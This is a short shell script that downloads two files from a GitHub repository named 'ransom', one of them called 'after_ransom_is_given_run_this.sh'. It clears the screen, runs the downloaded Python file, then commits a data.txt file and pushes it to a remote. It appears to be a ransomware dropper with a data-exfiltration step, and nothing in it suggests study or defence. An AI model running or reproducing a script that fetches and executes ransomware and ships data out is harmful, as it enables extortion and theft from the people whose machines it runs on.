wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=true
wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
mv monsterwith23faces.py\?raw=true monsterwith23faces.py
mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.sh
clear
#!/bin/bash
python monsterwith23faces.py
git add ./data.txt
git commit -m "Uploaded data file"
git push origin master
